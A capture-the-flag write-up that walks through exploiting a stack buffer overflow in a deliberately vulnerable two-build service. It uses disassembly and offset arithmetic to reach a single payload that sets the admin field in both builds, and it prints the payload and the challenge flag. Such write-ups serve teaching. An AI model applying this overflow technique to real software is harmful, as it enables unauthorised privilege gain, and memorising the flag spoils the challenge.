## Solution

**TL;DR** — `ledgerd` is one C source built twice. The two builds agree on
the `struct session` layout (that part is frozen by the ABI), but they do
*not* agree on where the struct lands in the stack frame: the compat build
keeps a scratch buffer the production build optimizes away. The audit gate
reads `session.admin` straight out of memory, and `tag <text>` strcpy()s
your line over that struct — so the distance from the tag buffer to
`admin` is **120 in compat** and **88 in prod**. The mirror only opens the
report when *both* builds pass, so the winning payload carries the audit
token at both offsets at once.

```
"A"*88 + "&YA1" + "A"*28 + "&YA1"
```

---

### 1. Recon

Connect and poke around:

```
$ nc <host> 1337
ordinary engineering — ledgerd 2.4.1 (reconciliation mirror)
commands: tag <text> | audit | state | layout | quit
ready.
layout
prod: sizeof(session)=144 owner=+0 admin=+24 note=+48 | frame map (vendor rev 4, may not match local toolchains): tag -0x50 session -0xc0 — compat: sizeof(session)=144 ... (identical)
audit
prod: AUDIT_DENIED — compat: AUDIT_DENIED
```

Two things to notice:

- `layout` prints the same numbers for both builds. That is real: struct
  layout is fixed by the ABI, optimization does not touch it. It is also a
  red herring — the *frame* (where the struct sits relative to the tag
  buffer) is not part of the ABI, and that is the only thing the builds
  disagree on. The "vendor frame map" in the same line is decorative.
- `audit` runs on both builds and both must pass. Anything that only
  convinces one build is worth nothing.

### 2. The handout

`handout/` contains both builds, static and stripped. They run anywhere
(no libc needed), so all the reverse engineering can be done offline; the
flag itself only exists on the service, so local work is safe.

```
$ file ledgerd-prod
ledgerd-prod: ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

### 3. Finding the bug

The command dispatcher is easy to spot even stripped — the commands are
compared as dword immediates (`tag ` = `0x20676174`, `audit` = `0x69647561`,
...). Around the `tag` branch:

**prod** (`0x401910`):

```asm
401910:  lea    rsi,[rsp+0xd4]        ; line + 4
401918:  mov    rdi,rsp               ; tag buffer
40191b:  call   0x401018              ; strcpy(tag, line+4) — no bound
```

An unbounded `strcpy` out of a 256-byte input line into a 64-byte local.
That is the bug. Now, what is worth hitting with it?

The audit gate is the only interesting consumer of memory:

**prod** (`0x401840`, the `AUDIT_OK`/`AUDIT_DENIED` decision):

```asm
401840:  xor    eax,eax
401842:  cmp    edi,0x31415926        ; AU-7 separation token
401848:  sete   al
40184b:  ret
```

**compat** (`0x401827`):

```asm
401827:  push   rbp
401828:  mov    rbp,rsp
40182b:  mov    QWORD PTR [rbp-0x8],rdi
40182f:  mov    rax,QWORD PTR [rbp-0x8]
401833:  mov    eax,DWORD PTR [rax+0x18]   ; s->admin  (struct offset +24)
401836:  cmp    eax,0x31415926
40183b:  sete   al
```

So the goal: make the `admin` field of the session struct equal
`0x31415926`. Little-endian that is the byte string `26 59 41 31` —
`&YA1` — deliberately printable and NUL-free, so the payload can ride a
plain `tag` line (a NUL would end the `strcpy`).

Note the gate *loads* `admin` from memory at audit time. The source keeps
`session_open(&s)` / `session_audit(&s)` in separate non-inlinable
functions, so the compiler cannot cache the field — even the `-O3` build
reads whatever the `strcpy` left there. That is what makes the bug usable
against an optimized build at all.

### 4. The compat build (-O0): admin at tag+120

The compat build keeps a frame pointer and lays locals out in a readable
order (`line` `rbp-0x1f0`, `tag` `rbp-0xf0`, struct `rbp-0x90`):

```asm
4018fc:  lea    rax,[rbp-0x1f0]       ; line
401903:  add    rax,0x4
401907:  lea    rdx,[rbp-0xf0]        ; tag
401914:  call   strcpy                ; strcpy(tag, line+4)
...
401959:  lea    rax,[rbp-0x90]        ; &session
401963:  call   0x401827              ; session_audit(&s)
```

Between `tag` (ends at `rbp-0xb0`) and the struct there is a 32-byte
scratch buffer (`rbp-0xb0`..`rbp-0x90`). So:

```
tag -> s.admin distance = 0xf0 - 0x78 = 0x78 = 120
```

Payload: `"A"*120 + "&YA1"` → **compat: AUDIT_OK**.

### 5. The prod build (-O3): admin at tag+88

The prod build drops the frame pointer and — the title of the challenge —
**the scratch buffer is gone**: a dead local is exactly the kind of thing
`-O3` optimizes away. The struct slides down to sit right behind the tag
buffer:

```asm
401884:  lea    r13,[rsp+0x40]        ; &session
401889:  lea    rbx,[rsp+0xd0]        ; line
...
401910:  lea    rsi,[rsp+0xd4]
401918:  mov    rdi,rsp               ; tag — now at rsp+0x00
40191b:  call   strcpy
...
401947:  mov    edi,DWORD PTR [rsp+0x58]   ; s->admin, loaded at audit time
40194b:  call   0x401840                   ; session_audit
```

```
tag -> s.admin distance = 0x58 - 0x00 = 88
```

Payload: `"A"*88 + "&YA1"` → **prod: AUDIT_OK**.

(You can watch the difference from the outside: after `"A"*88 + "&YA1"`,
`state` shows prod's `owner`/`mode`/`epoch`/`balance` full of `A`s while
compat is untouched — the same 92 bytes landed in a different frame.)

### 6. One payload, two frames

Here is the catch. Fixing compat with the `+120` payload corrupts prod:
its `A` filler runs straight through prod's `admin` at offset 88. Fixing
prod after that corrupts compat again. One offset per frame — and the
mirror wants both at once.

But the two offsets are different, and the audit token is NUL-free, so a
single tag line can carry the token at *both* distances:

```
offset 0..87    'A' padding            (harmless everywhere)
offset 88..91   "&YA1"                 -> prod: session.admin
offset 92..119  'A' padding            (compat: scratch tail; prod: mode/epoch/balance)
offset 120..123 "&YA1"                 -> compat: session.admin
```

Cross-check: in compat, the token at 88 lands inside the (present) scratch
buffer — harmless. In prod, the token at 120 lands inside session
`note[]` — harmless. Nothing in the payload is ever checked by the build
it is not aimed at.

```
$ python3 - <<'EOF'
tok = b"&YA1"
payload = b"A"*88 + tok + b"A"*28 + tok
print("tag ".encode() + payload)
EOF
tag AAAA...AAAA&YA1AAAA...AAAA&YA1      # one line, 124 chars of payload
audit
prod: AUDIT_OK — compat: AUDIT_OK
reconciliation complete across both builds — cyber_quest{7w0_bu1ld5_0n3_p4y104d_b7f4a2}
```

`admin/solve.py` does the whole dance over a socket, including showing the
one-offset-per-frame catch before firing the combined payload.

### 7. Alternative paths

- **Sequential**: `tag @88`, `tag @120`, `tag @88` also ends with both
  builds OK (the third payload re-fixes prod without touching compat's
  admin — it stops writing at offset 92). Two payloads can never do it.
- **Brute force**: the audit verdict per build is visible feedback, so
  scanning the offset is possible — but every probe that fixes one build
  breaks the other, so you converge on the combined payload anyway.

### Flag

```
cyber_quest{7w0_bu1ld5_0n3_p4y104d_b7f4a2}
```
